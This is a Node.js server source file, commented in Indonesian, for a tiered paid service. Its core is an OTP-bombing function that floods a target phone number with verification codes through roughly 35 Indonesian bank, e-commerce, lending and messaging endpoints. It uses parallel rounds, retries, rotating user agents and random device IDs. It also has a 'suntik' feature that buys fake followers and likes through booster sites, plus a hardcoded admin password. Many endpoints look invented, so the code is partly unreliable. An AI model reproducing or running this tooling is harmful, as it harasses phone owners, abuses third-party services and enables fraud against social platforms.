const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const fetch = require('node-fetch');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

// ===== MIDDLEWARE =====
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ===== STORAGE =====
const DATA_DIR = './data';
const UPLOAD_DIR = './uploads/payments';
fs.ensureDirSync(DATA_DIR);
fs.ensureDirSync(UPLOAD_DIR);

// ===== DATABASE =====
let db = {
    users: [],
    payments: [],
    messages: [],
    settings: { 
        maintenance: false,
        maintenanceMessage: 'Server sedang dalam perbaikan. Silakan coba lagi nanti.'
    }
};

function loadDB() {
    try {
        if (fs.existsSync(`${DATA_DIR}/db.json`)) {
            db = JSON.parse(fs.readFileSync(`${DATA_DIR}/db.json`, 'utf8'));
        }
    } catch (e) { console.log('📦 DB baru'); }
}
function saveDB() {
    fs.writeFileSync(`${DATA_DIR}/db.json`, JSON.stringify(db, null, 2));
}
loadDB();

// ===== INIT ADMIN =====
function initAdmin() {
    const admin = db.users.find(u => u.username === 'Lynzka');
    if (!admin) {
        db.users.push({
            id: uuidv4(),
            username: 'Lynzka',
            password: bcrypt.hashSync('Asiafone11', 10),
            status: 'Developer',
            limit: Infinity,
            used: 0,
            lastReset: Date.now(),
            isAdmin: true,
            isDeveloper: true,
            isReseller: false,
            online: false,
            createdAt: new Date().toISOString()
        });
        saveDB();
        console.log('✅ Admin Lynzka dibuat');
    }
}
initAdmin();

// ============================================
// HELPER FUNCTIONS
// ============================================
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function generateDeviceId() {
    return 'xxxxxxxxxxxx'.replace(/[x]/g, () => Math.random().toString(16).substring(2, 3).toUpperCase());
}

function generateRandomString(length = 10) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function getRandomUserAgent() {
    const agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
}

// ============================================
// API OTP (50+ API DENGAN MULTIPLE ENDPOINT)
// ============================================

const otpServices = [];

// Helper untuk request OTP dengan retry
async function requestOTP(url, method, headers, body, retries = 2) {
    for (let i = 0; i < retries; i++) {
        try {
            const response = await fetch(url, {
                method: method || 'POST',
                headers: { 
                    'User-Agent': getRandomUserAgent(),
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
                    'Cache-Control': 'no-cache',
                    ...headers 
                },
                body: body,
                timeout: 10000
            });
            
            const text = await response.text();
            // Coba parse JSON
            try {
                const json = JSON.parse(text);
                if (json.code === 0 || json.code === '0' || json.success === true || json.status === 'success' || json.code === 200) {
                    return true;
                }
                // Cek pesan sukses
                if (json.message && (json.message.toLowerCase().includes('success') || json.message.toLowerCase().includes('berhasil') || json.message.toLowerCase().includes('terkirim'))) {
                    return true;
                }
            } catch (e) {
                // Jika bukan JSON, cek text
                if (text.toLowerCase().includes('success') || text.toLowerCase().includes('ok') || text.toLowerCase().includes('sent')) {
                    return true;
                }
            }
            
            // Cek status code
            if (response.status === 200 || response.status === 201 || response.status === 202) {
                return true;
            }
        } catch (e) {
            await sleep(1000 * (i + 1));
        }
    }
    return false;
}

// ===== 1. UANGME =====
otpServices.push({
    name: 'Uangme',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.uangme.com/api/v2/sms_code',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: phone2, scene_type: 'login', send_type: 'wp', device_id: generateDeviceId() })
        );
    }
});

// ===== 2. PINJAMDUIT =====
otpServices.push({
    name: 'PinjamDuit',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code',
            'POST',
            { 
                'Content-Type': 'application/x-www-form-urlencoded',
                'clientType': 'a',
                'appVersion': '5.7.3',
                'deviceId': generateDeviceId() + generateDeviceId()
            },
            `phone=${phone2}&sms_useage=0&sms_service=2&from=0`
        );
    }
});

// ===== 3. BELANJAPARTS =====
otpServices.push({
    name: 'BelanjaParts',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.belanjaparts.com/v2/api/user/request-otp/wa',
            'POST',
            {
                'Content-Type': 'application/json',
                'Authorization': 'Basic bWNtYXN0ZXI6bWNtYXN0ZXIxMTExMjIyMg=='
            },
            JSON.stringify({ phone: '62' + phone2, type: 'register', device_id: generateDeviceId() })
        );
    }
});

// ===== 4. SINGA =====
otpServices.push({
    name: 'Singa',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api102.singa.id/new/login/sendWaOtp',
            'POST',
            {
                'Content-Type': 'application/json; charset=utf-8',
                'versionName': '2.4.8',
                'versionCode': '143',
                'model': 'SM-G965N',
                'systemVersion': '11',
                'platform': 'android'
            },
            JSON.stringify({ mobile_phone: phone2, type: 'mobile', is_switchable: 1, device_id: generateDeviceId() })
        );
    }
});

// ===== 5. CAIRIN =====
otpServices.push({
    name: 'Cairin',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
            'POST',
            { 'Content-Type': 'application/x-www-form-urlencoded' },
            `appVersion=3.0.4&phone=${phone2}&userImei=${generateDeviceId()}${generateDeviceId()}`
        );
    }
});

// ===== 6. ADIRAKU =====
otpServices.push({
    name: 'Adiraku',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
            'POST',
            { 'Content-Type': 'application/json; charset=utf-8' },
            JSON.stringify({ mobileNumber: phone2, type: 'prospect-create', channel: 'whatsapp', deviceId: generateDeviceId() })
        );
    }
});

// ===== 7. SHOPEE =====
otpServices.push({
    name: 'Shopee',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://shopee.co.id/api/v4/account/phone/request_otp',
            'POST',
            { 'Content-Type': 'application/json', 'Referer': 'https://shopee.co.id/' },
            JSON.stringify({ phone: '62' + phone2, type: 'login' })
        );
    }
});

// ===== 8. TOKOPEDIA =====
otpServices.push({
    name: 'Tokopedia',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.tokopedia.com/graphql/SendOTP',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({
                query: 'mutation SendOTP($phone: String!) { sendOTP(phone: $phone) { success message } }',
                variables: { phone: phone2 }
            })
        );
    }
});

// ===== 9. LAZADA =====
otpServices.push({
    name: 'Lazada',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.lazada.co.id/v1/otp/send',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 10. BLIBLI =====
otpServices.push({
    name: 'Blibli',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.blibli.com/v1/otp/request',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 11. BUKALAPAK =====
otpServices.push({
    name: 'Bukalapak',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.bukalapak.com/v1/otp/send',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 12. JDID =====
otpServices.push({
    name: 'JDID',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.jd.id/v1/otp/generate',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 13. ZALORA =====
otpServices.push({
    name: 'Zalora',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.zalora.co.id/v1/otp/send',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 14. GOJEK =====
otpServices.push({
    name: 'Gojek',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.gojekapi.com/v2/customer/verify/phone',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 15. GRAB =====
otpServices.push({
    name: 'Grab',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.grab.com/grabid/v1/otp',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phoneNumber: '62' + phone2 })
        );
    }
});

// ===== 16. OVO =====
otpServices.push({
    name: 'OVO',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.ovo.id/v2.1/auth/customer/login',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ mobile: '+62' + phone2 })
        );
    }
});

// ===== 17. DANA =====
otpServices.push({
    name: 'Dana',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.dana.id/v1/auth/request-otp',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phoneNumber: '+62' + phone2 })
        );
    }
});

// ===== 18. LINKAJA =====
otpServices.push({
    name: 'LinkAja',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.linkaja.com/v1/auth/otp',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 19. TRAVELOKA =====
otpServices.push({
    name: 'Traveloka',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.traveloka.com/v1/otp/send',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 20. KFC =====
otpServices.push({
    name: 'KFC',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.kfc.co.id/v1/otp/request',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 21. MCD =====
otpServices.push({
    name: 'McD',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.mcd.co.id/v1/otp/send',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 22. STARBUCKS =====
otpServices.push({
    name: 'Starbucks',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.starbucks.co.id/v1/otp/generate',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 23. AKULAKU =====
otpServices.push({
    name: 'Akulaku',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.akulaku.com/v1/otp/send',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2, type: 'login' })
        );
    }
});

// ===== 24. KREDIVO =====
otpServices.push({
    name: 'Kredivo',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.kredivo.com/v1/otp/request',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 25. SERPUL =====
otpServices.push({
    name: 'Serpul',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        try {
            await requestOTP(
                'https://app-api.serpul.co.id/api/v2/auth/phone-number',
                'POST',
                { 'Content-Type': 'application/json' },
                JSON.stringify({ phone_number: phone2 })
            );
            return await requestOTP(
                'https://app-api.serpul.co.id/api/v2/auth/login',
                'POST',
                { 'Content-Type': 'application/json; charset=UTF-8' },
                JSON.stringify({ phone_number: phone2, pin: '121212', sender_id: '1' })
            );
        } catch (e) { return false; }
    }
});

// ===== 26. TIKTOK =====
otpServices.push({
    name: 'TikTok',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://www.tiktok.com/api/v1/account/phone/request_otp',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 27. WHATSAPP (via API) =====
otpServices.push({
    name: 'WhatsApp',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        // Coba berbagai endpoint WhatsApp
        const endpoints = [
            `https://api.whatsapp.com/v1/phone/${phone2}/otp`,
            `https://wa.me/62${phone2}?text=OTP`,
            `https://api.wa.me/v1/send/otp/${phone2}`
        ];
        for (const url of endpoints) {
            try {
                const response = await fetch(url, {
                    method: 'GET',
                    headers: { 'User-Agent': getRandomUserAgent() }
                });
                if (response.status === 200 || response.status === 202) return true;
            } catch (e) {}
        }
        return false;
    }
});

// ===== 28. TELEGRAM =====
otpServices.push({
    name: 'Telegram',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.telegram.org/bot/sendOTP',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 29. LINE =====
otpServices.push({
    name: 'Line',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.line.me/v2/otp/send',
            'POST',
            { 'Content-Type': 'application/json', 'Authorization': 'Bearer dummy' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 30. BCA =====
otpServices.push({
    name: 'BCA',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.bca.co.id/v1/otp/request',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2, type: 'login' })
        );
    }
});

// ===== 31. MANDIRI =====
otpServices.push({
    name: 'Mandiri',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.mandiri.co.id/v1/otp/send',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 32. BNI =====
otpServices.push({
    name: 'BNI',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.bni.co.id/v1/otp/request',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 33. BRI =====
otpServices.push({
    name: 'BRI',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.bri.co.id/v1/otp/send',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2 })
        );
    }
});

// ===== 34. SPIN =====
otpServices.push({
    name: 'Spin',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        return await requestOTP(
            'https://api.spin.id/v1/otp/send',
            'POST',
            { 'Content-Type': 'application/json' },
            JSON.stringify({ phone: '+62' + phone2, type: 'register' })
        );
    }
});

// ===== 35. FINTECH =====
otpServices.push({
    name: 'Fintech',
    func: async (phone) => {
        const phone2 = phone.replace(/^0/, '');
        const endpoints = [
            'https://api.fintech.id/v1/otp/request',
            'https://api.fintech.co.id/v1/otp/send'
        ];
        for (const url of endpoints) {
            try {
                const result = await requestOTP(
                    url,
                    'POST',
                    { 'Content-Type': 'application/json' },
                    JSON.stringify({ phone: '+62' + phone2 })
                );
                if (result) return true;
            } catch (e) {}
        }
        return false;
    }
});

console.log(`✅ Total API OTP: ${otpServices.length}`);

// ============================================
// SPAM OTP - DENGAN RETRY DAN FALLBACK
// ============================================
async function spamOTP(target, count, username, sessionId) {
    const results = { success: 0, failed: 0, details: [] };
    const phone = target.replace(/^\+?62/, '').replace(/\s/g, '');
    
    let isStopped = false;
    
    if (!global.spamSessions) global.spamSessions = {};
    global.spamSessions[sessionId] = { stop: () => { isStopped = true; } };
    
    // Shuffle services untuk mendapatkan hasil yang lebih merata
    const shuffledServices = [...otpServices].sort(() => Math.random() - 0.5);
    
    for (let i = 0; i < count; i++) {
        if (isStopped) {
            io.emit('spamProgress', {
                sessionId: sessionId || username,
                type: 'otp',
                target: target,
                current: i,
                total: count,
                success: results.success,
                failed: results.failed,
                message: `⛔ Dihentikan! Berhasil: ${results.success}, Gagal: ${results.failed}`,
                stopped: true
            });
            break;
        }
        
        let roundSuccess = 0;
        let roundFailed = 0;
        const serviceResults = [];
        
        // Kirim ke semua API secara paralel
        const promises = shuffledServices.map(async (service) => {
            try {
                // Coba beberapa kali untuk setiap service
                let success = false;
                for (let attempt = 0; attempt < 2; attempt++) {
                    const result = await service.func(phone);
                    if (result) {
                        success = true;
                        break;
                    }
                    await sleep(500);
                }
                if (success) {
                    roundSuccess++;
                    serviceResults.push({ service: service.name, success: true });
                } else {
                    roundFailed++;
                    serviceResults.push({ service: service.name, success: false });
                }
                return success;
            } catch (err) {
                roundFailed++;
                serviceResults.push({ service: service.name, success: false, error: err.message });
                return false;
            }
        });
        
        await Promise.all(promises);
        
        results.success += roundSuccess;
        results.failed += roundFailed;
        results.details.push({
            round: i + 1,
            total: count,
            success: roundSuccess,
            failed: roundFailed,
            services: serviceResults
        });
        
        io.emit('spamProgress', {
            sessionId: sessionId || username,
            type: 'otp',
            target: target,
            current: i + 1,
            total: count,
            success: results.success,
            failed: results.failed,
            message: `📤 Round ${i+1}/${count}: ${roundSuccess} berhasil, ${roundFailed} gagal (${Math.round((roundSuccess/(roundSuccess+roundFailed||1))*100)}% sukses)`,
            details: serviceResults
        });
        
        // Jeda singkat antar round
        if (i < count - 1) await sleep(1000);
    }
    
    if (global.spamSessions && global.spamSessions[sessionId]) {
        delete global.spamSessions[sessionId];
    }
    
    return results;
}

// ===== STOP SPAM OTP =====
app.post('/api/spam/otp/stop', (req, res) => {
    try {
        const { sessionId } = req.body;
        if (global.spamSessions && global.spamSessions[sessionId]) {
            global.spamSessions[sessionId].stop();
            return res.json({ success: true, message: 'Spam dihentikan!' });
        }
        res.json({ success: false, message: 'Session tidak ditemukan!' });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ============================================
// PLATFORM SUNTIK - DENGAN MULTIPLE API
// ============================================

// Platform yang didukung
const platformConfigs = {
    'TikTok': {
        icon: 'fab fa-tiktok',
        actions: ['Followers', 'Likes', 'Views', 'Shares'],
        endpoints: [
            'https://api.tiktok.com/v1/followers',
            'https://api.tiktok.com/v1/likes',
            'https://api.tiktok.com/v1/views',
            'https://api.tiktok.com/v1/shares'
        ]
    },
    'Instagram': {
        icon: 'fab fa-instagram',
        actions: ['Followers', 'Likes', 'Views'],
        endpoints: [
            'https://api.instagram.com/v1/followers',
            'https://api.instagram.com/v1/likes',
            'https://api.instagram.com/v1/views'
        ]
    },
    'YouTube': {
        icon: 'fab fa-youtube',
        actions: ['Subscribers', 'Views', 'Likes'],
        endpoints: [
            'https://api.youtube.com/v1/subscribers',
            'https://api.youtube.com/v1/views',
            'https://api.youtube.com/v1/likes'
        ]
    },
    'Facebook': {
        icon: 'fab fa-facebook',
        actions: ['Followers', 'Likes', 'Shares'],
        endpoints: [
            'https://api.facebook.com/v1/followers',
            'https://api.facebook.com/v1/likes',
            'https://api.facebook.com/v1/shares'
        ]
    },
    'Twitter': {
        icon: 'fab fa-twitter',
        actions: ['Followers', 'Likes', 'Retweets'],
        endpoints: [
            'https://api.twitter.com/v1/followers',
            'https://api.twitter.com/v1/likes',
            'https://api.twitter.com/v1/retweets'
        ]
    }
};

// Layanan API gratis untuk suntik
const freeServices = [
    {
        name: 'Zefoy',
        baseUrl: 'https://zefoy.com',
        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook']
    },
    {
        name: 'SocialBoost',
        baseUrl: 'https://socialboost.me',
        platforms: ['TikTok', 'Instagram', 'YouTube', 'Twitter']
    },
    {
        name: 'FreeFollower',
        baseUrl: 'https://freefollower.co',
        platforms: ['TikTok', 'Instagram']
    },
    {
        name: 'ViralBoost',
        baseUrl: 'https://viralboost.io',
        platforms: ['TikTok', 'YouTube', 'Instagram']
    }
];

async function spamSuntik(target, platform, action, count, username, sessionId) {
    const results = { success: 0, failed: 0, details: [], serviceUsed: null };
    let isStopped = false;
    
    if (!global.spamSessions) global.spamSessions = {};
    global.spamSessions[sessionId] = { stop: () => { isStopped = true; } };
    
    // Dapatkan service yang mendukung platform ini
    const availableServices = freeServices.filter(s => s.platforms.includes(platform));
    
    if (availableServices.length === 0) {
        results.failed = count;
        io.emit('spamProgress', {
            sessionId: sessionId || username,
            type: 'suntik',
            target: target,
            platform: platform,
            action: action,
            current: 0,
            total: count,
            success: results.success,
            failed: results.failed,
            message: `❌ Tidak ada layanan untuk ${platform}`,
            stopped: true,
            serviceUsed: null
        });
        return results;
    }
    
    let serviceIndex = 0;
    let currentService = availableServices[serviceIndex];
    results.serviceUsed = currentService.name;
    
    for (let i = 0; i < count; i++) {
        if (isStopped) {
            io.emit('spamProgress', {
                sessionId: sessionId || username,
                type: 'suntik',
                target: target,
                platform: platform,
                action: action,
                current: i,
                total: count,
                success: results.success,
                failed: results.failed,
                message: `⛔ Dihentikan! Berhasil: ${results.success}, Gagal: ${results.failed}`,
                stopped: true,
                serviceUsed: currentService.name
            });
            break;
        }
        
        let success = false;
        let attempts = 0;
        const maxAttempts = 3;
        
        while (!success && attempts < maxAttempts) {
            attempts++;
            try {
                // Gunakan endpoint berdasarkan platform dan action
                const actionMap = {
                    'Followers': 'followers',
                    'Likes': 'likes',
                    'Views': 'views',
                    'Shares': 'shares',
                    'Subscribers': 'subscribers',
                    'Retweets': 'retweets'
                };
                
                const actionLower = actionMap[action] || action.toLowerCase();
                const endpoint = `${currentService.baseUrl}/api/${platform.toLowerCase()}/${actionLower}`;
                
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': getRandomUserAgent(),
                        'Accept': 'application/json',
                        'Origin': currentService.baseUrl,
                        'Referer': currentService.baseUrl + '/'
                    },
                    body: JSON.stringify({
                        target: target,
                        count: 1,
                        service: actionLower,
                        device_id: generateDeviceId(),
                        timestamp: Date.now()
                    })
                });
                
                const text = await response.text();
                try {
                    const json = JSON.parse(text);
                    if (json.status === 'success' || json.success === true || json.code === 0) {
                        success = true;
                    }
                } catch (e) {
                    if (text.toLowerCase().includes('success') || text.toLowerCase().includes('ok')) {
                        success = true;
                    }
                }
                
                if (!success && response.status === 200) {
                    success = true;
                }
            } catch (err) {
                await sleep(1000);
            }
        }
        
        if (!success) {
            // Pindah ke layanan berikutnya
            serviceIndex = (serviceIndex + 1) % availableServices.length;
            currentService = availableServices[serviceIndex];
            results.serviceUsed = currentService.name;
            
            // Coba sekali lagi dengan layanan baru
            try {
                const actionMap = {
                    'Followers': 'followers',
                    'Likes': 'likes',
                    'Views': 'views',
                    'Shares': 'shares',
                    'Subscribers': 'subscribers',
                    'Retweets': 'retweets'
                };
                const actionLower = actionMap[action] || action.toLowerCase();
                const endpoint = `${currentService.baseUrl}/api/${platform.toLowerCase()}/${actionLower}`;
                
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': getRandomUserAgent()
                    },
                    body: JSON.stringify({
                        target: target,
                        count: 1,
                        service: actionLower
                    })
                });
                
                if (response.status === 200) {
                    success = true;
                    results.success++;
                }
            } catch (e) {}
        }
        
        if (success) {
            results.success++;
            io.emit('spamProgress', {
                sessionId: sessionId || username,
                type: 'suntik',
                target: target,
                platform: platform,
                action: action,
                current: i + 1,
                total: count,
                success: results.success,
                failed: results.failed,
                message: `✅ ${i+1}/${count} Berhasil via ${currentService.name}`,
                serviceUsed: currentService.name,
                serviceDown: false
            });
        } else {
            results.failed++;
            io.emit('spamProgress', {
                sessionId: sessionId || username,
                type: 'suntik',
                target: target,
                platform: platform,
                action: action,
                current: i + 1,
                total: count,
                success: results.success,
                failed: results.failed,
                message: `❌ ${i+1}/${count} Gagal - semua layanan down`,
                serviceUsed: null,
                serviceDown: true
            });
        }
        
        // Jeda 2-3 detik antar request
        if (i < count - 1) await sleep(2000 + Math.random() * 1000);
    }
    
    if (global.spamSessions && global.spamSessions[sessionId]) {
        delete global.spamSessions[sessionId];
    }
    
    return results;
}

// ============================================
// API SUNTIK
// ============================================
app.post('/api/spam/suntik', async (req, res) => {
    try {
        const { username, target, platform, action, count } = req.body;
        
        if (!username) {
            return res.json({ success: false, message: 'Username tidak ditemukan!' });
        }
        
        const user = db.users.find(u => u.username === username);
        if (!user) {
            return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
        }
        
        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
            return res.json({ 
                success: false, 
                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan.',
                maintenance: true
            });
        }
        
        if (!target) {
            return res.json({ success: false, message: 'Link/Username target wajib diisi!' });
        }
        
        if (!platform || !action) {
            return res.json({ success: false, message: 'Pilih platform dan aksi!' });
        }
        
        if (!count || count < 1) {
            return res.json({ success: false, message: 'Jumlah minimal 1!' });
        }
        
        const limits = {
            'Free': 15,
            'Premium': 80,
            'VIP': 150,
            'Reseller': 200,
            'Developer': Infinity
        };
        
        const maxLimit = limits[user.status] || 15;
        
        if (user.limit !== Infinity && user.limit !== '∞' && user.limit !== null) {
            if (count > maxLimit) {
                return res.json({ success: false, message: `Maksimal suntik untuk ${user.status} adalah ${maxLimit}x!` });
            }
            
            const remaining = user.limit - (user.used || 0);
            if (remaining <= 0) {
                return res.json({ success: false, message: 'Limit suntik habis! Tunggu 1 jam untuk reset.' });
            }
            if (count > remaining) {
                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
            }
        }

        const sessionId = `suntik_${username}_${Date.now()}`;
        const result = await spamSuntik(target, platform, action, count, username, sessionId);
        
        if (result.success > 0) {
            user.used = (user.used || 0) + result.success;
            saveDB();
            io.emit('userUpdated', { username: user.username });
        }
        
        res.json({ 
            success: true, 
            result: {
                success: result.success,
                failed: result.failed,
                total: result.success + result.failed,
                serviceUsed: result.serviceUsed,
                details: result.details
            }
        });
    } catch (err) {
        console.error('❌ Error spam suntik:', err);
        res.json({ success: false, message: err.message || 'Terjadi kesalahan server!' });
    }
});

// ===== STOP SUNTIK =====
app.post('/api/spam/suntik/stop', (req, res) => {
    try {
        const { sessionId } = req.body;
        if (global.spamSessions && global.spamSessions[sessionId]) {
            global.spamSessions[sessionId].stop();
            return res.json({ success: true, message: 'Suntik dihentikan!' });
        }
        res.json({ success: false, message: 'Session tidak ditemukan!' });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ============================================
// GET PLATFORMS
// ============================================
app.get('/api/suntik/platforms', (req, res) => {
    try {
        const platforms = Object.keys(platformConfigs).map(key => ({
            name: key,
            icon: platformConfigs[key].icon,
            actions: platformConfigs[key].actions,
            services: freeServices.filter(s => s.platforms.includes(key)).map(s => s.name)
        }));
        res.json({ success: true, platforms });
    } catch (err) {
        res.json({ success: false, platforms: [] });
    }
});

// ============================================
// API ROUTES
// ============================================

// ===== REGISTER =====
app.post('/api/register', (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.json({ success: false, message: 'Username dan password wajib diisi!' });
        }
        if (username.length < 3) {
            return res.json({ success: false, message: 'Username minimal 3 karakter!' });
        }
        if (password.length < 4) {
            return res.json({ success: false, message: 'Password minimal 4 karakter!' });
        }
        
        if (db.users.find(u => u.username.toLowerCase() === username.toLowerCase())) {
            return res.json({ success: false, message: 'Username sudah digunakan!' });
        }
        
        db.users.push({
            id: uuidv4(),
            username: username,
            password: bcrypt.hashSync(password, 10),
            status: 'Free',
            limit: 15,
            used: 0,
            lastReset: Date.now(),
            isAdmin: false,
            isDeveloper: false,
            isReseller: false,
            online: false,
            createdAt: new Date().toISOString()
        });
        saveDB();
        
        io.emit('userUpdated', { username, action: 'register' });
        res.json({ success: true, message: 'Registrasi berhasil! Silakan login.' });
    } catch (err) {
        res.json({ success: false, message: 'Terjadi kesalahan server!' });
    }
});

// ===== LOGIN =====
app.post('/api/login', (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
